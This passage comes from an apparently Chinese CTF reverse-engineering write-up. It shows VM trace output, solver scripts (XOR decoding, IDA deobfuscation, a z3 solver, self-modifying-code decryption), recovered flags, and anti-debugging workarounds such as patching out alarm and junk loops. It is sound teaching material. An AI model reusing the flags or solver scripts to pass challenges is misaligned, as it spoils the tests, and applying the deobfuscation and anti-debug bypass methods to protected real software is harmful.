0x2c--------------------[0728] :: mov s2, &amp;s6[0730] :: add s5, s5, s2[0733] :: mov s6, &amp;0[0734] :: mov s2, &amp;arr[1][0735] :: mov s6, s2[0736] :: exec r736.r_address &lt;- 803425fc4080007fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x7f--------------------[0745] :: mov s2, &amp;s6[0747] :: add s5, s5, s2[0750] :: mov s6, &amp;0[0751] :: mov s2, &amp;arr[1][0752] :: mov s6, s2[0753] :: exec r753.r_address &lt;- 803425fc40800035c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x35--------------------[0762] :: mov s2, &amp;s6[0764] :: add s5, s5, s2[0767] :: mov s6, &amp;0[0768] :: mov s2, &amp;arr[1][0769] :: mov s6, s2[0770] :: exec r770.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[0779] :: mov s2, &amp;s6[0781] :: add s5, s5, s2[0784] :: mov s6, &amp;0[0785] :: mov s2, &amp;arr[1][0786] :: mov s6, s2[0787] :: exec r787.r_address &lt;- 803425fc40800032c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x32--------------------[0796] :: mov s2, &amp;s6[0798] :: add s5, s5, s2[0801] :: mov s6, &amp;0[0802] :: mov s2, &amp;arr[1][0803] :: mov s6, s2[0804] :: exec r804.r_address &lt;- 803425fc40800037c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x37--------------------[0813] :: mov s2, &amp;s6[0815] :: add s5, s5, s2[0818] :: mov s6, &amp;0[0819] :: mov s2, &amp;arr[1][0820] :: mov s6, s2[0821] :: exec r821.r_address &lt;- 803425fc4080003bc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x3b--------------------[0830] :: mov s2, &amp;s6[0832] :: add s5, s5, s2[0835] :: mov s6, &amp;0[0836] :: mov s2, &amp;arr[1][0837] :: mov s6, s2[0838] :: exec r838.r_address &lt;- 803425fc40800022c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x22--------------------[0847] :: mov s2, &amp;s6[0849] :: add s5, s5, s2[0852] :: mov s6, &amp;0[0853] :: mov s2, &amp;arr[1][0854] :: mov s6, s2[0855] :: exec r855.r_address &lt;- 803425fc40800059c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x59--------------------[0864] :: mov s2, &amp;s6[0866] :: add s5, s5, s2[0869] :: mov s6, &amp;0[0870] :: mov s2, &amp;arr[2][0871] :: mov s6, s2[0872] :: exec r872.r_address &lt;- 803425fc40800053c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x53--------------------[0881] :: mov s2, &amp;s6[0883] :: add s5, s5, s2[0886] :: mov s6, &amp;0[0887] :: mov s2, &amp;arr[2][0888] :: mov s6, s2[0889] :: exec r889.r_address &lt;- 803425fc4080008ec3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x8e--------------------[0898] :: mov s2, &amp;s6[0900] :: add s5, s5, s2[0903] :: mov s6, &amp;0[0904] :: mov s2, &amp;arr[2][0905] :: mov s6, s2[0906] :: exec r906.r_address &lt;- 803425fc4080003dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x3d--------------------[0915] :: mov s2, &amp;s6[0917] :: add s5, s5, s2[0920] :: mov s6, &amp;0[0921] :: mov s2, &amp;arr[2][0922] :: mov s6, s2[0923] :: exec r923.r_address &lt;- 803425fc4080002ac3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2a--------------------[0932] :: mov s2, &amp;s6[0934] :: add s5, s5, s2[0937] :: mov s6, &amp;0[0938] :: mov s2, &amp;arr[2][0939] :: mov s6, s2[0940] :: exec r940.r_address &lt;- 803425fc40800059c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x59--------------------[0949] :: mov s2, &amp;s6[0951] :: add s5, s5, s2[0954] :: mov s6, &amp;0[0955] :: mov s2, &amp;arr[2][0956] :: mov s6, s2[0957] :: exec r957.r_address &lt;- 803425fc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x27--------------------[0966] :: mov s2, &amp;s6[0968] :: add s5, s5, s2[0971] :: mov s6, &amp;0[0972] :: mov s2, &amp;arr[2][0973] :: mov s6, s2[0974] :: exec r974.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[0983] :: mov s2, &amp;s6[0985] :: add s5, s5, s2[0988] :: mov s6, &amp;0[0989] :: mov s2, &amp;arr[2][0990] :: mov s6, s2[0991] :: exec r991.r_address &lt;- 803425fc40800029c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x29--------------------[1000] :: mov s2, &amp;s6[1002] :: add s5, s5, s2[1005] :: mov s6, &amp;0[1006] :: mov s2, &amp;arr[3][1007] :: mov s6, s2[1008] :: exec r1008.r_address &lt;- 803425fc40800034c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x34--------------------[1017] :: mov s2, &amp;s6[1019] :: add s5, s5, s2[1022] :: mov s6, &amp;0[1023] :: mov s2, &amp;arr[3][1024] :: mov s6, s2[1025] :: exec r1025.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[1034] :: mov s2, &amp;s6[1036] :: add s5, s5, s2[1039] :: mov s6, &amp;0[1040] :: mov s2, &amp;arr[3][1041] :: mov s6, s2[1042] :: exec r1042.r_address &lt;- 803425fc40800061c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x61--------------------[1051] :: mov s2, &amp;s6[1053] :: add s5, s5, s2[1056] :: mov s6, &amp;0[1057] :: mov s2, &amp;arr[3][1058] :: mov s6, s2[1059] :: exec r1059.r_address &lt;- 803425fc40800032c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x32--------------------[1068] :: mov s2, &amp;s6[1070] :: add s5, s5, s2[1073] :: mov s6, &amp;0[1074] :: mov s2, &amp;flag[28][1075] :: mov s6, s2[1076] :: mov s2, &amp;flag[29][1077] :: mov s7, s2[1078] :: mov s8, &amp;0[1079] :: mov s2, &amp;s8[1080] :: add s8, s8, s2[1083] :: mov s2, &amp;s6[1084] :: add s8, s8, s2[1087] :: mov s9, &amp;0[1088] :: mov s2, &amp;s9[1089] :: add s9, s9, s2[1092] :: mov s2, &amp;s7[1093] :: add s9, s9, s2[1096] :: mov s2, &amp;s9[1097] :: add s10, s8, s2[1100] :: exec r1100.r_address &lt;- 8034255c4180006cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0x6c--------------------[1109] :: mov s2, &amp;s10[1111] :: add s5, s5, s2[1114] :: mov s6, &amp;0[1115] :: mov s7, &amp;0[1116] :: mov s8, &amp;0[1117] :: mov s9, &amp;0[1118] :: mov s10, &amp;0[1119] :: mov s2, &amp;flag[28][1120] :: mov s6, s2[1121] :: mov s2, &amp;flag[29][1122] :: mov s7, s2[1123] :: mov s8, &amp;0[1124] :: mov s2, &amp;s8[1125] :: add s8, s8, s2[1128] :: mov s2, &amp;s6[1129] :: add s8, s8, s2[1132] :: mov s2, &amp;s8[1133] :: add s8, s8, s2[1136] :: mov s9, &amp;0[1137] :: mov s2, &amp;s9[1138] :: add s9, s9, s2[1141] :: mov s2, &amp;s7[1142] :: add s9, s9, s2[1145] :: mov s2, &amp;s9[1146] :: add s10, s8, s2[1149] :: exec r1149.r_address &lt;- 8034255c418000a1c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xa1--------------------[1158] :: mov s2, &amp;s10[1160] :: add s5, s5, s2[1163] :: mov s6, &amp;0[1164] :: mov s7, &amp;0[1165] :: mov s8, &amp;0[1166] :: mov s9, &amp;0[1167] :: mov s10, &amp;0[1168] :: mov s2, &amp;flag[30][1169] :: mov s6, s2[1170] :: mov s2, &amp;flag[31][1171] :: mov s7, s2[1172] :: mov s8, &amp;0[1173] :: mov s2, &amp;s8[1174] :: add s8, s8, s2[1177] :: mov s2, &amp;s6[1178] :: add s8, s8, s2[1181] :: mov s9, &amp;0[1182] :: mov s2, &amp;s9[1183] :: add s9, s9, s2[1186] :: mov s2, &amp;s7[1187] :: add s9, s9, s2[1190] :: mov s2, &amp;s9[1191] :: add s10, s8, s2[1194] :: exec r1194.r_address &lt;- 8034255c418000b1c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xb1--------------------[1203] :: mov s2, &amp;s10[1205] :: add s5, s5, s2[1208] :: mov s6, &amp;0[1209] :: mov s7, &amp;0[1210] :: mov s8, &amp;0[1211] :: mov s9, &amp;0[1212] :: mov s10, &amp;0[1213] :: mov s2, &amp;flag[30][1214] :: mov s6, s2[1215] :: mov s2, &amp;flag[31][1216] :: mov s7, s2[1217] :: mov s8, &amp;0[1218] :: mov s2, &amp;s8[1219] :: add s8, s8, s2[1222] :: mov s2, &amp;s6[1223] :: add s8, s8, s2[1226] :: mov s2, &amp;s8[1227] :: add s8, s8, s2[1230] :: mov s9, &amp;0[1231] :: mov s2, &amp;s9[1232] :: add s9, s9, s2[1235] :: mov s2, &amp;s7[1236] :: add s9, s9, s2[1239] :: mov s2, &amp;s9[1240] :: add s10, s8, s2[1243] :: exec r1243.r_address &lt;- 8034255c418000e5c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xe5--------------------[1252] :: mov s2, &amp;s10[1254] :: add s5, s5, s2[1257] :: mov s6, &amp;0[1258] :: mov s7, &amp;0[1259] :: mov s8, &amp;0[1260] :: mov s9, &amp;0[1261] :: mov s10, &amp;0[1262] :: mov s2, &amp;s5[1264] :: mov(1) fail(), 大致思路是对输入异或然后+i对比数据 但是flag数组前四个没直接给出，有四个大数字以第一个为例1585408084625667200 转为16进制16008040cc253480 倒叙一下就是 803425cc40800016，再根据后面的数据类推，flag[0]就是0x16 123456789101112131415import hashlibxor=[0x16,0x17,0x10,0x12,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x24,0x2c,0x26,0x1e,0x1f,0x20,0x20,0x21,0x23,0x27,0x24,0x25,0x26,0x27]encflag=[0x70,0x7c,0x73,0x78,0x6f,0x27,0x2a,0x2c,0x7f,0x35,0x2d,0x32,0x37,0x3b,0x22,0x59,0x53,0x8e,0x3d,0x2a,0x59,0x27,0x2d,0x29,0x34,0x2d,0x61,0x32]a=&quot;&quot;for i in range(len(encflag)): a+=chr((encflag[i]-i)^xor[i])l = &quot;1234567890abcdef&quot;for b in l: for c in l: for d in l: flag = a+b+c+d+&quot;&#125;&quot; sha = hashlib.sha256(flag.encode(&quot;utf-8&quot;)).hexdigest() if sha[0:16] == &quot;f860464d767610bb&quot;: print(flag) break 最后的flag：flag{366c950370fec47e34581a0574} find_basicIDA 静态分析，可以明显看出程序加过 VM 且每个 handler 自身作为分发器 call进入的后是switch语句，再根据之前的赋值执行相应的操作 大概混肴逻辑是先赋值一个数，这个数决定了下面函数的操作，进入下面的call函数，执行相应的语句 trace记录debugger打开tracing window 在的打开view里面的tracing 然后点亮代码跟踪 但是在调试时候会有如下报错 1F7CF3464: got SIGTRAP signal (Trace trap) (exc.code 5, tid 8259) 正常调试是没用问题的，启用trace之后就会报错，这里设置一下ida调试debugger option 选择最下方edit exceptions 其他类似的报错也可如此，但是究其原理，类似是创造了一个死循环，有师傅懂得的话欢迎评论 参考： 常见反调试整理 (nigoule.com) Linux进程被信号杀死后退出状态码(exit code)的分析_halfclear的博客-CSDN博客_exitcode 例如移除时钟报错，有一种思路就是更换函数 1234移除alarm函数# 将程序名为ProgrammName中的alarm替换为isnan &gt;sed -i s/alarm/isnan/g ./ProgrammName 为了方便查看trace代码，这里还有一个垃圾循环我们可以修改一下 主要逻辑是产生了一个随机数后逻辑与0xFF，不断地比较。如果小于就自增一在继续判断，不断地循环直到和产生的随机数相等再推出循环。经过分析该循环体内没有需要的数据。我们可以直接patch跳转条件 或者在call完rand函数之后下一个不执行但是修改eax值的断点 然后我们就可以下断点trcace我们的代码 接着就可以分析相关的执行数据 例如这里就是我们的数据 以下类推可以得到最终的逻辑 或者我们可以写脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133from idc import *from capstone import *from keystone import *md = Cs(CS_ARCH_X86, CS_MODE_32)ks = Ks(KS_ARCH_X86, KS_MODE_32)def mydis(code, addr=0): for i in md.disasm(code, addr): return (&#x27;%s %s&#x27; %(i.mnemonic, i.op_str))def myasm(dis_txt, addr=0): #keystone fail encoding, count = ks.asm(dis_txt, addr=addr) return bytes(encoding)class Block: def __init__(self, start_ea, end_ea, imm, reg, call_target): self.start_ea = start_ea self.end_ea = end_ea self.imm = imm self.reg = reg self.call_target = call_targetregnums = []def get_block(start_ea): mnem_list = [&#x27;pushf&#x27;, &#x27;pusha&#x27;, &#x27;mov&#x27;, &#x27;call&#x27;, &#x27;pop&#x27;] ea = start_ea i = 0 while i &lt; 5: mnem = idc.print_insn_mnem(ea) if mnem_list[i%5] != mnem: raise 0 if mnem == &#x27;mov&#x27;: imm = idc.get_operand_value(ea, 1) # 17 -&gt; cl, 18 -&gt; dl, 19 -&gt; bl reg = idc.get_operand_value(ea, 0) #reg_id &#x27;&#x27;&#x27; if reg not in regnums: print (&#x27;reg=%s, ea=%x&#x27; %(reg, ea)) regnums.append(reg) &#x27;&#x27;&#x27; if mnem == &#x27;call&#x27;: call_target = idc.get_operand_value(ea, 0) i += 1 ea += idc.get_item_size(ea) return Block(start_ea, ea, imm, reg, call_target)def check_mnem(ea, should_mnem): mnem = idc.print_insn_mnem(ea) if mnem != should_mnem: assert 0def get_real_code(block, new_code, new_code_ea): ea = block.call_target while True: mnem = idc.print_insn_mnem(ea) if mnem == &#x27;cmp&#x27;: reg = idc.get_operand_value(ea, 0) imm = idc.get_operand_value(ea, 1) if (reg == block.reg) &amp; (imm == block.imm): break ea += idc.get_item_size(ea) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;jnz&#x27;) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;popa&#x27;) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;popf&#x27;) ea += idc.get_item_size(ea) mnem = idc.print_insn_mnem(ea) if mnem == &#x27;pushf&#x27;: print (&#x27;find ret: ea=%x&#x27; %ea) new_code += myasm(&#x27;ret&#x27;, new_code_ea+len(new_code)) return True, new_code while True: mnem = idc.print_insn_mnem(ea) if mnem == &#x27;jmp&#x27;: break dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea) print (&#x27;block=%x, ea=%x, dis=%s&#x27; %(block.start_ea, ea, dis)) new_code += myasm(dis, new_code_ea+len(new_code)) ea += idc.get_item_size(ea) return False, new_codedef handle_one_fun(fun_start, new_code_ea): ea = fun_start new_code = b&#x27;&#x27; while True: mnem = idc.print_insn_mnem(ea) if mnem != &#x27;pushf&#x27;: dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea) print(&#x27;ea=%x, dis=%s&#x27; % (ea, dis)) new_code += myasm(dis, new_code_ea + len(new_code)) if mnem == &#x27;retn&#x27;: break ea += idc.get_item_size(ea) else: print (&#x27;get_block ea=%x&#x27; %ea) myblock = get_block(ea) #print (&#x27;ea=%x, new_ea=%x&#x27; %(myblock.start_ea, new_code_ea+len(new_code))) ret, new_code = get_real_code(myblock, new_code, new_code_ea) if ret: break ea = myblock.end_ea return new_codenew_code_start = 0x96150ida_bytes.patch_bytes(new_code_start, b&#x27;\\x90&#x27;*0x10000)for i in range(0x10000): idc.del_items(i+new_code_start)funs = [0x48F4, 0x48c8, 0x3fbf, 0x3F1B, 0x4148, 0x750A9, 0x33EC]new_code_ea = new_code_startfor fun in funs: print (&#x27;--------------------------------&#x27;) print (&#x27;fun=%x, new_fun=%x&#x27; %(fun, new_code_ea)) print (&#x27;--------------------------------&#x27;) new_code = handle_one_fun(fun, new_code_ea) ida_bytes.patch_bytes(new_code_ea, new_code) idc.create_insn(new_code_ea) ida_funcs.add_func(new_code_ea) new_code_ea += len(new_code) 最后z3求解 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from z3 import *flag = [BitVec(&#x27;x%d&#x27; % i, 8) for i in range(28)]s = Solver()v5 = 40085 * flag[3]- 222506 * flag[2]+ 54507 * flag[4]+ 88056 * flag[1]+ 212571 * flag[5]- 160722 * flag[0]-0x6A31Ds.add(v5==0)v5 = 49300 * flag[3]+ 259229 * flag[0]+ 278066 * flag[2]- 127937 * flag[1]- 295169 * flag[4]- 8368677s.add(v5==0)v5 = 42214 * flag[1]- 108025 * flag[3]+ 205972 * flag[0]+ 27559 * flag[2]- 17114904s.add(v5==0)v5 = - 151496 * flag[1]+ 204740 * flag[0]+ 80143 * flag[2]- 12295783s.add(v5==0)v5 = 241935 * flag[1]+ 124128 * flag[0]- 38790036+ 273221 * flag[0]- 27868542s.add(v5==0)v6 = -279656 * flag[2]- 199574 * flag[1]- 258130 * flag[8]- 200399 * flag[3]- 173903 * flag[7]+ 175816 * flag[0]- 234569 * flag[6]- 108273 * flag[4]- 222957 * flag[5]+ 128244179s.add(v6==0)v6 = - 81541 * flag[1]- 268763 * flag[0]+ 219073 * flag[3]+ 34782 * flag[6]+ 21153 * flag[5]+ 173005 * flag[7]+ 76285 * flag[4]+ 32825 * flag[2]- 13874925s.add(v6==0)v6 = 85214 * flag[2]- 268299 * flag[3]- 230981 * flag[1]+ 290772 * flag[5]- 74394 * flag[4]+ 28044 * flag[6]- 242995 * flag[0]+ 50871139s.add(v6==0)v7 = -208564 * flag[0] + 81934 * flag[9] - 106641 * flag[7] + 198477 * flag[2] + 154505 * flag[1] + 48440 * flag[5] - 149004 * flag[3] - 108909 * flag[4] - 51714 * flag[10] - 296420 * flag[8] + 263021 * flag[6] + 688726 s.add(v7==0)v7 = - 131130 * flag[2] + 224265 * flag[3] + 230702 * flag[0] - 176285 * flag[7] - 274778 * flag[4] + 103848 * flag[8] - 136039 * flag[9] - 241151 * flag[5] + 15542 * flag[6] - 17521 * flag[1] + 41644083s.add(v7==0)v8 = 195056 * flag[4]- 15717 * flag[9]- 180214 * flag[6]- 114427 * flag[5]+ 277782 * flag[7]+ 261379 * flag[8]- 225266 * flag[2]+ 107609 * flag[0]+ 259792 * flag[3]+ 270563 * flag[11]+ 205124 * flag[1]+ 138334 * flag[10]+ 103474 * flag[12]- 117027475s.add(v8==0)v8 = 189573 * flag[8]+ 64393 * flag[6]+ 231137 * flag[1]+ 145315 * flag[4]- 53938 * flag[10]- 291345 * flag[5]+ 216413 * flag[3]- 204681 * flag[0]- 65519 * flag[9]- 262826 * flag[2]+ 187002 * flag[7]+ 271732 * flag[11]- 38663722s.add(v8==0)v9 = 15645 * flag[13] + 276267 * flag[12] + 31190 * flag[5] - 244002 * flag[2] + 81415 * flag[3] - 22940 * flag[10] - 126076 * flag[7] + 8932 * flag[8] + 112153 * flag[4] + 194218 * flag[11] + 197656 * flag[9] - 204463 * flag[0] - 219500 * flag[1] + 19777 * flag[6] - 24531260s.add(v9==0)v10 = 279969 * flag[8]- 123977 * flag[4]+ 162094 * flag[0]- 215769 * flag[1]- 18878 * flag[14]- 80292 * flag[11]- 237675 * flag[5]- 222121 * flag[6]+ 269381 * flag[12]+ 153934 * flag[13]- 165380 * flag[10]- 157137 * flag[2]- 186748 * flag[3]+ 170756 * flag[7]- 186932 * flag[9]+ 87264470s.add(v10==0)v11 = -87190 * flag[2]- 74836 * flag[1]+ 16892 * flag[9]- 185781 * flag[8]- 12726 * flag[7]+ 85022 * flag[12]+ 232989 * flag[10]+ 68516 * flag[0]- 120254 * flag[6]- 204892 * flag[5]- 65901 * flag[4]- 201087 * flag[13]+ 158612 * flag[11]- 49445 * flag[3]- 181860 * flag[14]- 111015 * flag[15]+ 43646834s.add(v11==0)v12 = -170184 * flag[3] - 137671 * flag[4] - 85374 * flag[9] - 73658 * flag[11] + 230891 * flag[13] + 54346 * flag[15] - 280694 * flag[0] + 60411 * flag[2] + 27171 * flag[7] - 50618 * flag[6] + 11843 * flag[10] + 131778 * flag[5] + 13956 * flag[8] - 42562 * flag[12] - 19972 * flag[1] - 145797 * flag[14] - 58717 * flag[16] + 74613584s.add(v12==0)v13 = 242475 * flag[16]- 234385 * flag[0]+ 124653 * flag[2]- 287929 * flag[13]- 190916 * flag[12]- 277578 * flag[11]+ 39 * flag[8]- 41625 * flag[6]+ 67262 * flag[5]- 250144 * flag[9]- 70886 * flag[10]- 223492 * flag[15]- 179651 * flag[7]+ 206538 * flag[17]+ 161965 * flag[3]- 146258 * flag[4]+ 167068 * flag[1]+ 196330 * flag[14]+ 76353817s.add(v13==0)v14 = 29700 * flag[18]- 60542 * flag[5]+ 274107 * flag[11]+ 154914 * flag[13]- 143185 * flag[12]+ 167424 * flag[2]+ 137439 * flag[8]- 186151 * flag[10]- 77157 * flag[9]- 233090 * flag[6]- 27400 * flag[7]- 76557 * flag[15]- 108002 * flag[17]+ 103161 * flag[14]- 133956 * flag[1]- 219502 * flag[4]- 202897 * flag[0]- 250957 * flag[3]- 119297 * flag[16]+ 100812197s.add(v14==0)v15 = -171971 * flag[9]+ 38740 * flag[4]+ -31661 * flag[10]+ -194653 * flag[18]+ -295910 * flag[16]+ 136489 * flag[12]+ 212619 * flag[17]+ 165592 * flag[11]+ 211791 * flag[1]+ 156909 * flag[2]+ -232187 * flag[8]+ -73709 * flag[7]+ 79735 * flag[14]+ 184882 * flag[13]+ 111105 * flag[6]+ 148840 * flag[3]+ -35774 * flag[19]+ -275711 * flag[0] + 135265 * flag[5] - 141221 * flag[15] - 39117122s.add(v15==0)v16 = -186514 * flag[17]+ -7791 * flag[2]+ 276755 * flag[11]+ -294815 * flag[14]+ -238763 * flag[15]+ -146099 * flag[5]+ 184977 * flag[16]+ 178413 * flag[1]+ 287303 * flag[3]+ -71946 * flag[10]+ -73771 * flag[9]+ -129032 * flag[18]+ 200202 * flag[20]+ -150509 * flag[6]+ -156625 * flag[13]+ 14093 * flag[7]+ 192584 * flag[12]- 122770 * flag[0]- 255494 * flag[8] + 65 * flag[4] - 108479 * flag[19] + 13521895s.add(v16==0)v17 = 210978 * flag[7]+ 300336 * flag[10]+ 207254 * flag[15]+ 216206 * flag[5]+ -63529 * flag[0]+ -274903 * flag[11]+ -10750 * flag[14]+ 25008 * flag[4]+ -100942 * flag[19]+ -104857 * flag[2]+ 266501 * flag[8]+ 229070 * flag[17]+ -234559 * flag[16]+ 298459 * flag[3]+ -172052 * flag[6]+ -98938 * flag[12]+ 66155 * flag[13]+ -84761 * flag[1]+ -283508 * flag[18]+ 288577 * flag[21] - 75407 * flag[20] - 204447 * flag[9] + 4351595s.add(v17==0)v18 = -201846 * flag[14]+ 272550 * flag[20]+ 60398 * flag[6]+ 45580 * flag[7]+ 195108 * flag[11]+ 38596 * flag[0]+ 220445 * flag[18]+ -190873 * flag[15]+ 103477 * flag[9]+ 118842 * flag[19]+ 206336 * flag[10]+ -249940 * flag[17]+ -48084 * flag[21]+ 104901 * flag[5]+ -48576 * flag[4]+ 287104 * flag[16]+ -286686 * flag[1]+ -30253 * flag[22]+ 121183 * flag[3]+ 90967 * flag[2]+ -195519 * flag[12] - 129304 * flag[8] + 141188 * flag[13] - 56642147s.add(v18==0)v19 = 110609 * flag[4]+ 5913 * flag[21]+ -197578 * flag[7]+ 45127 * flag[18]+ 282426 * flag[13]+ -71019 * flag[16]+ -6980 * flag[11]+ 208216 * flag[15]+ -13544 * flag[20]+ 17852 * flag[8]+ 167833 * flag[12]+ 145568 * flag[17]+ 3610 * flag[19]+ 91985 * flag[1]+ -267402 * flag[5]+ -32355 * flag[14]+ -197823 * flag[23]+ 135525 * flag[2]+ -229424 * flag[22]+ 38093 * flag[10]+ 50167 * flag[6]+ 118713 * flag[9] + 123874 * flag[0] - 89499 * flag[3] - 43090537s.add(v19==0)v1 = -164755 * flag[9] + 175470 * flag[8] - 28660 * flag[1] + 7217 * flag[11] - 295102 * flag[4] - 28531 * flag[19] - 106265 * flag[25] - 92750 * flag[10] + 16738 * flag[21] - 231714 * flag[6] + 172042 * flag[24] - 215890 * flag[17] + 199697 * flag[12] - 84235 * flag[7] + 44614 * flag[13] + 75104 * flag[5] - 195843 * flag[0] - 15784 * flag[14] - 131950 * flag[15] - 268167 * flag[16] - 197565 * flag[20] + 24340 * flag[23] + 105130 * flag[2] - 79750 * flag[22] - 264668 * flag[3] + 50329 * flag[18] + 137774797s.add(v1==0)v20 = 62119 * flag[17]- 17215 * flag[24]+ 289621 * flag[18]+ 53006 * flag[20]+ 95969 * flag[11]+ 202404 * flag[0]+ 247060 * flag[21]+ 144211 * flag[19]+ 280106 * flag[7]- 126431 * flag[10]- 226837 * flag[12]+ 10463 * flag[23]+ 121257 * flag[13]- 84190 * flag[9]+ 88917 * flag[1]+ 15453 * flag[14]+ 271442 * flag[4]+ 110851 * flag[3]- 231422 * flag[5]+ 176741 * flag[22]+ 266134 * flag[2]- 197327 * flag[6]- 55225 * flag[8] - 265465 * flag[15] + 119612 * flag[16] - 98514358s.add(v20==0)v2 = 151924 * flag[25] - 265311 * flag[6] + 107604 * flag[11] - 47851 * flag[24] + 227178 * flag[13] - 162699 * flag[2] + 2171 * flag[20] + 211070 * flag[23] + 94815 * flag[22] + 124760 * flag[16] + 41462 * flag[19] - 277022 * flag[15] - 62501 * flag[26] - 17727 * flag[14] - 257908 * flag[4] - 175112 * flag[21] + 8972 * flag[10] - 71801 * flag[8] - 114724 * flag[5] - 252898 * flag[9] + 161457 * flag[1] - 64461 * flag[0] - 111493 * flag[18] + 200145 * flag[17] - 290075 * flag[3] + 158466 * flag[12]v21 = v2 - 275262 * flag[7] + 86899519s.add(v21==0)v3 = 142850 * flag[18]- 166704 * flag[1]+ 284852 * flag[22]+ 248972 * flag[7]- 76200 * flag[17]+ 261708 * flag[19]+ 91911 * flag[24]+ 22347 * flag[3]+ 76006 * flag[21]+ 256511 * flag[6]- 100052 * flag[14]- 115830 * flag[2]- 93202 * flag[23]+ 248858 * flag[12]- 262669 * flag[10]+ 67895 * flag[5]- 111771 * flag[8]- 132193 * flag[11]- 141512 * flag[13]+ 139406 * flag[27]+ 109646 * flag[16]- 286309 * flag[9]+ 175476 * flag[15] + 138067 * flag[20] + 192825 * flag[25]s.add(flag[0] == 102)s.add(flag[1] == 108)s.add(flag[2] == 97)s.add(flag[3] == 103)s.add(flag[4] == 123)s.add(flag[27] == 125)s.add(199577 * flag[0] - 63091 * flag[4] + v3 - 285207 * flag[26] - 58820340 + v21 == 0)print(s.check())print(s.model())mod = s.model()print(&#x27;&#x27;.join([chr(mod[x].as_long()) for x in flag])) easyre首先来卡一下main函数 finger识别一下函数 fork函数在主进程返回的是子进程的PID，在子进程返回的是0，这里生成一个re3的文件 ptrace函数深入分析 - 黑箱 - 博客园 (cnblogs.com) 这里的ptrace比较重要代表不同的类型 光标在第一个参数上按M，搜索 ptrace，就可以得到相应的参数。 进入401f2f函数 4017e5函数，有一大串数据 似乎是对子进程进行了一些操作，我们去看看之前的re3文件 Int setjmp(jmp_buf env); ​ 返回值：若直接调用则返回0，若从longjmp调用返回则返回非0值的longjmp中的val值 Void longjmp(jmp_buf env,int val); ​ 调用此函数则返回到语句setjmp所在的地方，其中env 就是setjmp中的 env，而val 则是使setjmp的返回值变为val。 这里的loc_21F9是重要逻辑，跟进，看到一个int3，这里发出中断信号，等待主处理进程，然后主进程判断异常类型（这就是后面的值），然后执行smc操作，也照应了之前的wait函数。 下面我们再回到主进程分析一下smc 带参数启动调试。 主要smc逻辑 我们运用断点把数据提取出来 12345678910xorKey = &#123;8723: 2533025110152939745, 8739: 5590097037203163468, 8755: 17414346542877855401, 8771: 17520503086133755340, 8787: 12492599841064285544, 8803: 12384833368350302160, 8819: 11956541642520230699, 8835: 12628929057681570616, 8851: 910654967627959011, 8867: 5684234031469876551, 8883: 6000358478182005051, 8899: 3341586462889168127, 8915: 11094889238442167020, 8931: 17237527861538956365, 8947: 17178915143649401084, 8963: 11176844209899222046, 8979: 18079493192679046363, 8995: 7090159446630928781, 9011: 863094436381699168, 9027: 6906972144372600884, 9043: 16780793948225765908, 9059: 7086655467811962655, 9075: 13977154540038163446, 9091: 7066662532691991888, 9107: 15157921356638311270, 9123: 12585839823593393444, 9139: 1360651393631625694, 9155: 2139328426318955142, 9171: 2478274715212481947, 9187: 12876028885252459748, 9203: 18132176846268847269, 9219: 17242441603067001509, 9235: 8492111998925944081, 9251: 14679986489201789069, 9267: 13188777131396593592, 9283: 5298970373130621883, 9299: 525902164359904478, 9315: 2117701741234018776, 9331: 9158760851580517972&#125;addr = 0x2213while True: data = get_qword(addr) key = xorKey[addr] dec = data ^ key idc.patch_qword(addr, dec) addr += 16 之后跑脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384_BYTE *__fastcall sub_21F9(__int64 a1, __int64 a2, __int64 a3)&#123; _BYTE *result; // rax int v4; // [rsp+20h] [rbp-28h] int v5; // [rsp+24h] [rbp-24h] char v6; // [rsp+28h] [rbp-20h] int v7; // [rsp+2Ch] [rbp-1Ch] int j; // [rsp+30h] [rbp-18h] int v9; // [rsp+34h] [rbp-14h] int v10; // [rsp+38h] [rbp-10h] char v11; // [rsp+3Ch] [rbp-Ch] int v12; // [rsp+40h] [rbp-8h] int i; // [rsp+44h] 